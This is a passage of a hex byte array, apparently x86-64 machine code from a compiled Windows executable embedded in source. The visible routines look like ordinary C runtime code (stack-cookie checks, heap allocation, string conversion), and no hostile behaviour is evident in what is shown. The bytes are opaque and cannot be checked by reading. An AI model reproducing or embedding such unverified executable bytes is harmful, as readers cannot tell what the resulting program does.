0x9e, 0x89, 0x0, 0x0, 0x8b, 0xc8, 0x48, 0x89, 0x5f, 0x8, 0xc6, 0x47, 0x10, 0x1, 0xff, 0x15, 0x96, 0x89, 0x0, 0x0, 0xeb, 0x4, 0x48, 0x8b, 0x5a, 0x8, 0x48, 0x8d, 0x4, 0xde, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x55, 0x57, 0x41, 0x56, 0x48, 0x8d, 0xac, 0x24, 0x10, 0xfb, 0xff, 0xff, 0x48, 0x81, 0xec, 0xf0, 0x5, 0x0, 0x0, 0x48, 0x8b, 0x5, 0xa0, 0x29, 0x1, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x85, 0xe0, 0x4, 0x0, 0x0, 0x41, 0x8b, 0xf8, 0x8b, 0xf2, 0x8b, 0xd9, 0x83, 0xf9, 0xff, 0x74, 0x5, 0xe8, 0x11, 0xb2, 0xff, 0xff, 0x33, 0xd2, 0x48, 0x8d, 0x4c, 0x24, 0x70, 0x41, 0xb8, 0x98, 0x0, 0x0, 0x0, 0xe8, 0x83, 0xc0, 0xff, 0xff, 0x33, 0xd2, 0x48, 0x8d, 0x4d, 0x10, 0x41, 0xb8, 0xd0, 0x4, 0x0, 0x0, 0xe8, 0x72, 0xc0, 0xff, 0xff, 0x48, 0x8d, 0x44, 0x24, 0x70, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8d, 0x4d, 0x10, 0x48, 0x8d, 0x45, 0x10, 0x48, 0x89, 0x44, 0x24, 0x50, 0xff, 0x15, 0x95, 0x88, 0x0, 0x0, 0x4c, 0x8b, 0xb5, 0x8, 0x1, 0x0, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x40, 0x49, 0x8b, 0xce, 0x45, 0x33, 0xc0, 0xff, 0x15, 0x85, 0x88, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x36, 0x48, 0x83, 0x64, 0x24, 0x38, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x58, 0x48, 0x8b, 0x54, 0x24, 0x40, 0x4c, 0x8b, 0xc8, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x4d, 0x8b, 0xc6, 0x48, 0x8d, 0x4c, 0x24, 0x60, 0x48, 0x89, 0x4c, 0x24, 0x28, 0x48, 0x8d, 0x4d, 0x10, 0x48, 0x89, 0x4c, 0x24, 0x20, 0x33, 0xc9, 0xff, 0x15, 0x52, 0x88, 0x0, 0x0, 0x48, 0x8b, 0x85, 0x8, 0x5, 0x0, 0x0, 0x48, 0x89, 0x85, 0x8, 0x1, 0x0, 0x0, 0x48, 0x8d, 0x85, 0x8, 0x5, 0x0, 0x0, 0x48, 0x83, 0xc0, 0x8, 0x89, 0x74, 0x24, 0x70, 0x48, 0x89, 0x85, 0xa8, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x85, 0x8, 0x5, 0x0, 0x0, 0x48, 0x89, 0x45, 0x80, 0x89, 0x7c, 0x24, 0x74, 0xff, 0x15, 0x21, 0x88, 0x0, 0x0, 0x33, 0xc9, 0x8b, 0xf8, 0xff, 0x15, 0x27, 0x88, 0x0, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x48, 0xff, 0x15, 0x14, 0x88, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x10, 0x85, 0xff, 0x75, 0xc, 0x83, 0xfb, 0xff, 0x74, 0x7, 0x8b, 0xcb, 0xe8, 0x1c, 0xb1, 0xff, 0xff, 0x48, 0x8b, 0x8d, 0xe0, 0x4, 0x0, 0x0, 0x48, 0x33, 0xcc, 0xe8, 0xf1, 0x76, 0x0, 0x0, 0x4c, 0x8d, 0x9c, 0x24, 0xf0, 0x5, 0x0, 0x0, 0x49, 0x8b, 0x5b, 0x28, 0x49, 0x8b, 0x73, 0x30, 0x49, 0x8b, 0xe3, 0x41, 0x5e, 0x5f, 0x5d, 0xc3, 0xcc, 0x48, 0x89, 0xd, 0x59, 0x38, 0x1, 0x0, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x70, 0x48, 0x83, 0x65, 0xc0, 0x0, 0x83, 0x3d, 0x9f, 0x3e, 0x1, 0x0, 0x0, 0xc6, 0x45, 0xd0, 0x0, 0xc6, 0x45, 0xe8, 0x0, 0xc6, 0x45, 0xf0, 0x0, 0xc6, 0x45, 0xf8, 0x0, 0x75, 0x10, 0xf, 0x10, 0x5, 0x16, 0x2f, 0x1, 0x0, 0xc6, 0x45, 0xe8, 0x1, 0xf3, 0xf, 0x7f, 0x45, 0xd8, 0x48, 0x8d, 0x45, 0xc0, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8b, 0x45, 0x30, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x4a, 0x0, 0x0, 0x0, 0x80, 0x7d, 0xe8, 0x2, 0x75, 0xb, 0x48, 0x8b, 0x45, 0xc0, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x80, 0x7d, 0xf0, 0x0, 0x74, 0xf, 0x8b, 0x5d, 0xec, 0x48, 0x8d, 0x4d, 0xc0, 0xe8, 0xab, 0xf3, 0xff, 0xff, 0x89, 0x58, 0x20, 0x80, 0x7d, 0xf8, 0x0, 0x74, 0xf, 0x8b, 0x5d, 0xf4, 0x48, 0x8d, 0x4d, 0xc0, 0xe8, 0x96, 0xf3, 0xff, 0xff, 0x89, 0x58, 0x24, 0x48, 0x8b, 0x9c, 0x24, 0x80, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x70, 0x5d, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xe9, 0x41, 0x8b, 0xd9, 0x48, 0x8b, 0x4c, 0x24, 0x68, 0x49, 0x8b, 0xf8, 0x48, 0x8b, 0xf2, 0xe8, 0x1e, 0xfd, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x47, 0x48, 0x8b, 0x80, 0xb8, 0x3, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x3b, 0x49, 0xba, 0x70, 0x2a, 0x57, 0x34, 0x48, 0x1f, 0xbc, 0xd6, 0x48, 0x8b, 0x4c, 0x24, 0x60, 0x48, 0x8b, 0xd6, 0x48, 0x89, 0x4c, 0x24, 0x20, 0x4c, 0x8b, 0xc7, 0x48, 0x8b, 0xcd, 0x44, 0x8b, 0xcb, 0xff, 0x15, 0xeb, 0x88, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x30, 0x5f, 0xc3, 0x48, 0x8b, 0x54, 0x24, 0x68, 0x48, 0x8d, 0xd, 0x3a, 0x37, 0x1, 0x0, 0xe8, 0x2d, 0xfd, 0xff, 0xff, 0x4c, 0x8b, 0x1d, 0x36, 0x27, 0x1, 0x0, 0x48, 0x8b, 0x8, 0x41, 0x8b, 0xc3, 0x4c, 0x33, 0xd9, 0x83, 0xe0, 0x3f, 0x8a, 0xc8, 0x49, 0xd3, 0xcb, 0x4d, 0x85, 0xdb, 0x74, 0xf, 0x49, 0xba, 0x70, 0x2a, 0x57, 0x34, 0x48, 0x1f, 0xbc, 0xd6, 0x49, 0x8b, 0xc3, 0xeb, 0x92, 0x48, 0x8b, 0x44, 0x24, 0x60, 0x44, 0x8b, 0xcb, 0x4c, 0x8b, 0xc7, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0xe8, 0x22, 0x0, 0x0, 0x0, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x38, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x33, 0xc9, 0xe8, 0x7b, 0xfe, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x38, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xb9, 0x17, 0x0, 0x0, 0x0, 0xff, 0x15, 0x4d, 0x86, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x7, 0xb9, 0x5, 0x0, 0x0, 0x0, 0xcd, 0x29, 0x41, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xba, 0x17, 0x4, 0x0, 0xc0, 0x41, 0x8d, 0x48, 0x1, 0xe8, 0xe2, 0xfc, 0xff, 0xff, 0xff, 0x15, 0xd0, 0x86, 0x0, 0x0, 0x48, 0x8b, 0xc8, 0xba, 0x17, 0x4, 0x0, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0x48, 0xff, 0x25, 0xcd, 0x86, 0x0, 0x0, 0xcc, 0x33, 0xc0, 0x4c, 0x8d, 0xd, 0x53, 0x9b, 0x0, 0x0, 0x49, 0x8b, 0xd1, 0x44, 0x8d, 0x40, 0x8, 0x3b, 0xa, 0x74, 0x2b, 0xff, 0xc0, 0x49, 0x3, 0xd0, 0x83, 0xf8, 0x2d, 0x72, 0xf2, 0x8d, 0x41, 0xed, 0x83, 0xf8, 0x11, 0x77, 0x6, 0xb8, 0xd, 0x0, 0x0, 0x0, 0xc3, 0x81, 0xc1, 0x44, 0xff, 0xff, 0xff, 0xb8, 0x16, 0x0, 0x0, 0x0, 0x83, 0xf9, 0xe, 0x41, 0xf, 0x46, 0xc0, 0xc3, 0x41, 0x8b, 0x44, 0xc1, 0x4, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xd9, 0xe8, 0xdf, 0xf8, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x75, 0x9, 0x48, 0x8d, 0x5, 0x73, 0x26, 0x1, 0x0, 0xeb, 0x4, 0x48, 0x83, 0xc0, 0x24, 0x8b, 0xcb, 0x89, 0x18, 0xe8, 0x90, 0xff, 0xff, 0xff, 0x8b, 0xd8, 0xe8, 0xbd, 0xf8, 0xff, 0xff, 0x48, 0x8d, 0xd, 0x52, 0x26, 0x1, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x4, 0x48, 0x8d, 0x48, 0x20, 0x89, 0x19, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xda, 0xc6, 0x42, 0x38, 0x1, 0x89, 0x4a, 0x34, 0xe8, 0x5b, 0xff, 0xff, 0xff, 0x89, 0x43, 0x2c, 0xc6, 0x43, 0x30, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x77, 0xf8, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x75, 0x9, 0x48, 0x8d, 0x5, 0xb, 0x26, 0x1, 0x0, 0xeb, 0x4, 0x48, 0x83, 0xc0, 0x24, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x57, 0xf8, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x75, 0x9, 0x48, 0x8d, 0x5, 0xe7, 0x25, 0x1, 0x0, 0xeb, 0x4, 0x48, 0x83, 0xc0, 0x20, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x4c, 0x8b, 0xc2, 0x48, 0x8b, 0xd9, 0x48, 0x85, 0xc9, 0x74, 0xe, 0x33, 0xd2, 0x48, 0x8d, 0x42, 0xe0, 0x48, 0xf7, 0xf3, 0x49, 0x3b, 0xc0, 0x72, 0x43, 0x49, 0xf, 0xaf, 0xd8, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x85, 0xdb, 0x48, 0xf, 0x44, 0xd8, 0xeb, 0x15, 0xe8, 0xa2, 0x34, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x28, 0x48, 0x8b, 0xcb, 0xe8, 0x46, 0x24, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x1c, 0x48, 0x8b, 0xd, 0x2b, 0x37, 0x1, 0x0, 0x4c, 0x8b, 0xc3, 0xba, 0x8, 0x0, 0x0, 0x0, 0xff, 0x15, 0x95, 0x85, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0xd1, 0xeb, 0xd, 0xe8, 0x79, 0xff, 0xff, 0xff, 0xc7, 0x0, 0xc, 0x0, 0x0, 0x0, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x85, 0xc9, 0x74, 0x36, 0x53, 0x48, 0x83, 0xec, 0x20, 0x4c, 0x8b, 0xc1, 0x33, 0xd2, 0x48, 0x8b, 0xd, 0xea, 0x36, 0x1, 0x0, 0xff, 0x15, 0x64, 0x85, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x16, 0xff, 0x15, 0xaa, 0x84, 0x0, 0x0, 0x8b, 0xc8, 0xe8, 0x67, 0xfe, 0xff, 0xff, 0x8b, 0xd8, 0xe8, 0x34, 0xff, 0xff, 0xff, 0x89, 0x18, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x3b, 0xca, 0x73, 0x4, 0x83, 0xc8, 0xff, 0xc3, 0x33, 0xc0, 0x48, 0x3b, 0xca, 0xf, 0x97, 0xc0, 0xc3, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x30, 0x45, 0x33, 0xf6, 0x41, 0x8b, 0xe9, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x85, 0xc9, 0x75, 0x24, 0x44, 0x38, 0x72, 0x28, 0x74, 0xd, 0x48, 0x8b, 0x4a, 0x10, 0xe8, 0x77, 0xff, 0xff, 0xff, 0x44, 0x88, 0x73, 0x28, 0x4c, 0x89, 0x73, 0x10, 0x4c, 0x89, 0x73, 0x18, 0x4c, 0x89, 0x73, 0x20, 0xe9, 0xe, 0x1, 0x0, 0x0, 0x44, 0x38, 0x31, 0x75, 0x55, 0x4c, 0x39, 0x72, 0x18, 0x75, 0x45, 0x44, 0x38, 0x72, 0x28, 0x74, 0xd, 0x48, 0x8b, 0x4a, 0x10, 0xe8, 0x48, 0xff, 0xff, 0xff, 0x44, 0x88, 0x73, 0x28, 0xb9, 0x2, 0x0, 0x0, 0x0, 0xe8, 0xa, 0x2c, 0x0, 0x0, 0x48, 0x89, 0x43, 0x10, 0x49, 0x8b, 0xd6, 0x48, 0xf7, 0xd8, 0x1b, 0xc0, 0xf7, 0xd0, 0x83, 0xe0, 0xc, 0xf, 0x94, 0xc2, 0x85, 0xc0, 0xf, 0x94, 0xc1, 0x88, 0x4b, 0x28, 0x48, 0x89, 0x53, 0x18, 0x85, 0xc0, 0xf, 0x85, 0xc0, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x43, 0x10, 0x66, 0x44, 0x89, 0x30, 0xeb, 0x9d, 0x41, 0x83, 0xc9, 0xff, 0x44, 0x89, 0x74, 0x24, 0x28, 0x4c, 0x8b, 0xc7, 0x4c, 0x89, 0x74, 0x24, 0x20, 0x8b, 0xcd, 0x41, 0x8d, 0x51, 0xa, 0xe8, 0x28, 0x18, 0x0, 0x0, 0x48, 0x63, 0xf0, 0x85, 0xc0, 0x75, 0x16, 0xff, 0x15, 0xaf, 0x83, 0x0, 0x0, 0x8b, 0xc8, 0xe8, 0xb4, 0xfd, 0xff, 0xff, 0xe8, 0x3b, 0xfe, 0xff, 0xff, 0x8b, 0x0, 0xeb, 0x7d, 0x48, 0x8b, 0x53, 0x18, 0x48, 0x3b, 0xf2, 0x76, 0x41, 0x44, 0x38, 0x73, 0x28, 0x74, 0xd, 0x48, 0x8b, 0x4b, 0x10, 0xe8, 0xb7, 0xfe, 0xff, 0xff, 0x44, 0x88, 0x73, 0x28, 0x48, 0x8d, 0xc, 0x36, 0xe8, 0x7a, 0x2b, 0x0, 0x0, 0x48, 0x89, 0x43, 0x10, 0x49, 0x8b, 0xd6, 0x48, 0xf7, 0xd8, 0x1b, 0xc0, 0xf7, 0xd0, 0x83, 0xe0, 0xc, 0x48, 0xf, 0x44, 0xd6, 0x85, 0xc0, 0xf, 0x94, 0xc1, 0x88, 0x4b, 0x28, 0x48, 0x89, 0x53, 0x18, 0x85, 0xc0, 0x75, 0x33, 0x48, 0x8b, 0x43, 0x10, 0x41, 0x83, 0xc9, 0xff, 0x89, 0x54, 0x24, 0x28, 0x4c, 0x8b, 0xc7, 0x8b, 0xcd, 0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0x8d, 0x51, 0xa, 0xe8, 0xa2, 0x17, 0x0, 0x0, 0x48, 0x98, 0x48, 0x85, 0xc0, 0xf, 0x84, 0x76, 0xff, 0xff, 0xff, 0x48, 0xff, 0xc8, 0x48, 0x89, 0x43, 0x20, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x8b, 0x7c, 0x24, 0x58, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x40, 0x45, 0x33, 0xf6, 0x41, 0x8b, 0xe9, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x85, 0xc9, 0x75, 0x24, 0x44, 0x38, 0x72, 0x28, 0x74, 0xd, 0x48, 0x8b, 0x4a, 0x10, 0xe8, 0xfb, 0xfd, 0xff, 0xff, 0x44, 0x88, 0x73, 0x28, 0x4c, 0x89, 0x73, 0x10, 0x4c, 0x89, 0x73, 0x18, 0x4c, 0x89, 0x73, 0x20, 0xe9, 0x20, 0x1, 0x0, 0x0, 0x66, 0x44, 0x39, 0x31, 0x75, 0x54, 0x4c, 0x39, 0x72, 0x18, 0x75, 0x45, 0x44, 0x38, 0x72, 0x28, 0x74, 0xd, 0x48, 0x8b, 0x4a, 0x10, 0xe8, 0xcb, 0xfd, 0xff, 0xff, 0x44, 0x88, 0x73, 0x28, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xe8, 0x8d, 0x2a, 0x0, 0x0, 0x48, 0x89, 0x43, 0x10, 0x49, 0x8b, 0xd6, 0x48, 0xf7, 0xd8, 0x1b, 0xc0, 0xf7, 0xd0, 0x83, 0xe0, 0xc, 0xf, 0x94, 0xc2, 0x85, 0xc0, 0xf, 0x94, 0xc1, 0x88, 0x4b, 0x28, 0x48, 0x89, 0x53, 0x18, 0x85, 0xc0, 0xf, 0x85, 0xd1, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x43, 0x10, 0x44, 0x88, 0x30, 0xeb, 0x9d, 0x4c, 0x89, 0x74, 0x24, 0x38, 0x41, 0x83, 0xc9, 0xff, 0x4c, 0x89, 0x74, 0x24, 0x30, 0x4c, 0x8b, 0xc7, 0x44, 0x89, 0x74, 0x24, 0x28, 0x33, 0xd2, 0x8b, 0xcd, 0x4c, 0x89, 0x74, 0x24, 0x20, 0xe8, 0x0, 0x17, 0x0, 0x0, 0x48, 0x63, 0xf0, 0x85, 0xc0, 0x75, 0x19, 0xff, 0x15, 0x2b, 0x82, 0x0, 0x0, 0x8b, 0xc8, 0xe8, 0x30, 0xfc, 0xff, 0xff, 0xe8, 0xb7, 0xfc, 0xff, 0xff, 0x8b, 0x0, 0xe9, 0x84, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x53, 0x18, 0x48, 0x3b, 0xf2, 0x76, 0x40, 0x44, 0x38, 0x73, 0x28, 0x74, 0xd, 0x48, 0x8b, 0x4b, 0x10, 0xe8, 0x30, 0xfd, 0xff, 0xff, 0x44, 0x88, 0x73, 0x28, 0x48, 0x8b, 0xce, 0xe8, 0xf4, 0x29, 0x0, 0x0, 0x48, 0x89, 0x43, 0x10, 0x49, 0x8b, 0xd6, 0x48, 0xf7, 0xd8, 0x1b, 0xc0, 0xf7, 0xd0, 0x83, 0xe0, 0xc, 0x48, 0xf, 0x44, 0xd6, 0x85, 0xc0, 0xf, 0x94, 0xc1, 0x88, 0x4b, 0x28, 0x48, 0x89, 0x53, 0x18, 0x85, 0xc0, 0x75, 0x3b, 0x48, 0x8b, 0x43, 0x10, 0x41, 0x83, 0xc9, 0xff, 0x4c, 0x89, 0x74, 0x24, 0x38, 0x4c, 0x8b, 0xc7, 0x4c, 0x89, 0x74, 0x24, 0x30, 0x8b, 0xcd, 0x89, 0x54, 0x24, 0x28, 0x33, 0xd2, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x70, 0x16, 0x0, 0x0, 0x48, 0x98, 0x48, 0x85, 0xc0, 0xf, 0x84, 0x6c, 0xff, 0xff, 0xff, 0x48, 0xff, 0xc8, 0x48, 0x89, 0x43, 0x20, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0x6c, 0x24, 0x58, 0x48, 0x8b, 0x74, 0x24, 0x60, 0x48, 0x8b, 0x7c, 0x24, 0x68, 0x48, 0x83, 0xc4, 0x40, 0x41, 0x5e, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x50, 0x45, 0x33, 0xff, 0x4c, 0x8b, 0xea, 0x48, 0x8b, 0xd9, 0x48, 0x85, 0xd2, 0x75, 0x17, 0xe8, 0xe6, 0xfb, 0xff, 0xff, 0x41, 0x8d, 0x5d, 0x16, 0x89, 0x18, 0xe8, 0x9f, 0xfa, 0xff, 0xff, 0x8b, 0xc3, 0xe9, 0xd7, 0x1, 0x0, 0x0, 0xf, 0x57, 0xc0, 0x4c, 0x89, 0x3a, 0x48, 0x8b, 0x1, 0xf3, 0xf, 0x7f, 0x45, 0xe0, 0x4c, 0x89, 0x7d, 0xf0, 0x48, 0x85, 0xc0, 0xf, 0x84, 0x9d, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x55, 0x48, 0x66, 0xc7, 0x45, 0x48, 0x2a, 0x3f, 0x48, 0x8b, 0xc8, 0x44, 0x88, 0x7d, 0x4a, 0xe8, 0x4b, 0x36, 0x0, 0x0, 0x48, 0x8b, 0xb, 0x48, 0x85, 0xc0, 0x75, 0x3c, 0x4c, 0x8d, 0x4d, 0xe0, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0xe8, 0xc1, 0x1, 0x0, 0x0, 0x8b, 0xf0, 0x85, 0xc0, 0x74, 0x3a, 0x48, 0x8b, 0x7d, 0xe0, 0x48, 0x8b, 0xdf, 0x48, 0x3b, 0x7d, 0xe8, 0xf, 0x84, 0xdd, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xb, 0xe8, 0x6, 0xfc, 0xff, 0xff, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x3b, 0x5d, 0xe8, 0x75, 0xee, 0xe9, 0xc6, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x45, 0xe0, 0x48, 0x8b, 0xd0, 0xe8, 0xf, 0x3, 0x0, 0x0, 0x8b, 0xf0, 0x85, 0xc0, 0x75, 0x9, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x8b, 0x3, 0xeb, 0x82, 0x48, 0x8b, 0x7d, 0xe0, 0x48, 0x8b, 0xdf, 0x48, 0x3b, 0x7d, 0xe8, 0xf, 0x84, 0x9a, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xb, 0xe8, 0xc3, 0xfb, 0xff, 0xff, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x3b, 0x5d, 0xe8, 0x75, 0xee, 0xe9, 0x83, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x7d, 0xe0, 0x49, 0x83, 0xcc, 0xff, 0x48, 0x8b, 0x75, 0xe8, 0x49, 0x8b, 0xd7, 0x4c, 0x8b, 0xf6, 0x48, 0x89, 0x55, 0x50, 0x4c, 0x2b, 0xf7, 0x48, 0x8b, 0xc7, 0x49, 0xc1, 0xfe, 0x3, 0x49, 0xff, 0xc6, 0x48, 0x3b, 0xfe, 0x74, 0x22, 0x4c, 0x8b, 0x0, 0x49, 0x8b, 0xcc, 0x48, 0xff, 0xc1, 0x45, 0x38, 0x3c, 0x8, 0x75, 0xf7, 0x48, 0xff, 0xc2, 0x48, 0x83, 0xc0, 0x8, 0x48, 0x3, 0xd1, 0x48, 0x3b, 0xc6, 0x75, 0xe2, 0x48, 0x89, 0x55, 0x50, 0x41, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x49, 0x8b, 0xce, 0xe8, 0x8c, 0xe3, 0xff, 0xff, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0x32, 0x33, 0xc9, 0xe8, 0x4d, 0xfb, 0xff, 0xff, 0x48, 0x8b, 0xdf, 0x48, 0x3b, 0xfe, 0x74, 0x11, 0x48, 0x8b, 0xb, 0xe8, 0x3d, 0xfb, 0xff, 0xff, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x3b, 0xde, 0x75, 0xef, 0x41, 0x8b, 0xf4, 0x48, 0x8b, 0xcf, 0xe8, 0x29, 0xfb, 0xff, 0xff, 0x8b, 0xc6, 0xe9, 0x8d, 0x0, 0x0, 0x0, 0x4a, 0x8d, 0xc, 0xf0, 0x4c, 0x8b, 0xf7, 0x48, 0x89, 0x4d, 0x58, 0x4c, 0x8b, 0xe1, 0x48, 0x3b, 0xfe, 0x74, 0x4c, 0x48, 0x2b, 0xc7, 0x48, 0x89, 0x45, 0x48, 0x4d, 0x8b, 0x6, 0x49, 0x83, 0xcf, 0xff, 0x49, 0xff, 0xc7, 0x43, 0x80, 0x3c, 0x38, 0x0, 0x75, 0xf6, 0x48, 0x8b, 0xd1, 0x49, 0xff, 0xc7, 0x49, 0x2b, 0xd4, 0x4d, 0x8b, 0xcf, 0x48, 0x3, 0x55, 0x50, 0x49, 0x8b, 0xcc, 0xe8, 0x5f, 0x33, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x5e, 0x48, 0x8b, 0x45, 0x48, 0x48, 0x8b, 0x4d, 0x58, 0x4e, 0x89, 0x24, 0x30, 0x4d, 0x3, 0xe7, 0x49, 0x83, 0xc6, 0x8, 0x4c, 0x3b, 0xf6, 0x75, 0xbb, 0x33, 0xc9, 0x49, 0x89, 0x5d, 0x0, 0xe8, 0xb8, 0xfa, 0xff, 0xff, 0x48, 0x8b, 0xdf, 0x48, 0x3b, 0xfe, 0x74, 0x11, 0x48, 0x8b, 0xb, 0xe8, 0xa8, 0xfa, 0xff, 0xff, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x3b, 0xde, 0x75, 0xef, 0x48, 0x8b, 0xcf, 0xe8, 0x97, 0xfa, 0xff, 0xff, 0x33, 0xc0, 0x48, 0x8b, 0x9c, 0x24, 0x90, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x50, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5d, 0xc3, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x33, 0xc9, 0xe8, 0xb4, 0xf8, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x30, 0x48, 0x83, 0xcd, 0xff, 0x49, 0x8b, 0xf9, 0x33, 0xf6, 0x4d, 0x8b, 0xf0, 0x4c, 0x8b, 0xea, 0x4c, 0x8b, 0xe1, 0x48, 0xff, 0xc5, 0x40, 0x38, 0x34, 0x29, 0x75, 0xf7, 0xba, 0x1, 0x0, 0x0, 0x0, 0x49, 0x8b, 0xc6, 0x48, 0x3, 0xea, 0x48, 0xf7, 0xd0, 0x48, 0x3b, 0xe8, 0x76, 0x20, 0x8d, 0x42, 0xb, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0x6c, 0x24, 0x68, 0x48, 0x8b, 0x74, 0x24, 0x70, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0xc3, 0x4d, 0x8d, 0x78, 0x1, 0x4c, 0x3, 0xfd, 0x49, 0x8b, 0xcf, 0xe8, 0x73, 0xf9, 0xff, 0xff, 0x48, 0x8b, 0xd8, 0x4d, 0x85, 0xf6, 0x74, 0x19, 0x4d, 0x8b, 0xce, 0x4d, 